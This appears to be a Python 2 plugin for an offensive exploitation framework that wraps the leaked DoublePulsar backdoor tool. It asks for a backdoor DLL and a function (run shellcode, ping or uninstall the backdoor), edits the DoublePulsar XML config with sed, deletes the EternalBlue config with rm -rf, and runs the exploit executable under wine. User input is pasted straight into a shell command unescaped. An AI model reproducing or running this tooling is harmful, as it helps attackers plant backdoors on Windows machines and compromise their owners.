#!/usr/bin/python
# -*- coding: utf-8 -*-
import os, sys, time
import logging
#/* Exploits && payloads */
#####EB######
eternalblue = "Eternalblue-2.2.0.xml" #/* Eternalblue xml file*/
eternalblue_skel = "Eternalblue-2.2.0.Skeleton.xml" #/* eternalblue skeleton xml file*/
eternalblue_exe = "Eternalblue-2.2.0.exe" #/* eternalblue exe exploitation tool*/
####DP#######
doublepulsar = "Doublepulsar-1.3.1.xml" #/* doublepulsar xml file*/
doublepulsar_skel = "Doublepulsar-1.3.1.Skeleton.xml" #/* doublepulsar skeleton xml file*/
doublepulsar_exe = "Doublepulsar-1.3.1.exe" #/* doublepulsar exe exploitation tool */

RescoursesDir = os.getcwd()
intname = "rsf"
det = sys.argv[0]
fin = det.split('.')[-2]
__plugin__      = "%s.plugin" % (fin)

def dash():
    while True:
        line_1 = "" + intname + "(\033[1;31m" + fin + "\033[1;m) > "
        terminal = raw_input(line_1).lower()
        time.sleep(0.5)
        if terminal == 'help':
            print "\n"
            print "Core Commands"
            print "============="
            print ""
            print "  Command         Description"
            print "  -------         -----------"
            print "  help            show help menu"
            print "  execute         run the plugin"
            print "  exit            exit the current plugin"
            print ""
        elif terminal == 'execute':
            dub()
        elif terminal == 'exit':
            exit()
        else:
            print "Unknown syntax: %s" % (terminal)

def dub():
    #/* Default configs if no answer */
    default5 = "backdoor.dll"
    default8 = "0"
    default10 = "yes"
    #/* inputs for choosing settings */
    print "\033[1;94m[?]\033[1;m DLL :: Shellcode File, backdoor file to gain a response with the target"
    dll = raw_input('\033[1;92m[+]\033[1;m dll: [' + default5 + ']: ') or default5
    os.system('rm -rf Eternalblue-2.2.0.xml')
    time.sleep(0.2)
    print "\033[1;94m[?]\033[1;m Function :: Setup a function to do a service onto the target"
    print ""
    print "*0) RunDLL :: Run a shellcode"
    print " 1) Ping :: Ping backdoor"
    print " 2) Uninstall :: Uninstall backdoor"
    print ""
    function = raw_input('\033[1;92m[+]\033[1;m function: [' + default8 + ']: ') or default8
    if function == '0':
        os.system("sed 's/%FUNCTION%/RunDLL/' -i Doublepulsar-1.3.1.xml")
    elif function == '1':
        os.system("sed 's/%FUNCTION%/Ping/' -i Doublepulsar-1.3.1.xml")
    elif function == '2':
        os.system("sed 's/%FUNCTION%/Uninstall/' -i Doublepulsar-1.3.1.xml")
    else:
        print "choose an option!"

    #/* the dirty work made easy */
    os.system("sed -i 's/%DLLPAY%/" + dll + "/' Doublepulsar-1.3.1.xml")
    time.sleep(0.2)
    print "\033[1;94m[?]\033[1;m Configuring Plugin"
    time.sleep(1)
    print ""
    print "Name             Set Value"
    print "----             ----------"
    print "Payload          %s" % (dll)
    print "Function         %s" % (function)
    print "\n"
    et = raw_input("\033[1;94m[?]\033[1;m Execute Plugins? [" + default10 + "]: ")  or default10
    if et == 'yes':
        return double()
    elif et == 'no':
        print "Goodbye ;( you cant do anything else without eternalblue"
        sys.exit()
    else:
        print "\033[1;92m[!] No options were chosen.\033[1;m"

def double():
    #/*Prints out exploitation medthod and exploits using wine */
    print "\033[1;92m[*] Exploiting\033[1;m", doublepulsar_exe
    os.system("wine " + doublepulsar_exe + "")

dash()
